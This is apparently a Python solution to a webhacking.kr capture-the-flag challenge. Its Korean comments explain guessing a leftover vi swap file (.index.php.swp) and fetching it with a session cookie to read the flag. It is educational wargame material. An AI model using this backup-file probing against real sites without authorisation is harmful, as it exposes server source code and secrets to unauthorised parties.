from bs4 import BeautifulSoup
import requests

URL = "https://webhacking.kr/challenge/bonus-8"
URI = "/.index.php.swp"
PHPSESSID = 'jsm27523t35k3tpir7tgor97o2'

cookie = {'PHPSESSID' : PHPSESSID}

# 풀이
# 1. vi 에디터가 동작 중 강제 종료되었을 경우 swp 확장자인 임시파일이 생성되는 점을 이용
# 2. 파일 명이 .index.php.swp 인 링크를 실행하면 Flag 확인 가능
#    (1번 내용으로 index.php 뒤에 swp 확장자가 붙음을 확인할 수 있으며 Linux shell에서
#     ls를 했을때 읽을 수 없는 파일로 처리하기 위해 파일명 앞에 . 식별자를 붙이는 것에서 
#     착안해서 파일명 추측 가능)

# Get .index.php.swp
resp = requests.post(URL + URI, cookies=cookie)

# Extract Flag from .index.php.swp
FLAG = resp.text[resp.text.find('FLAG{') : resp.text.find('}') + 1]

print(FLAG)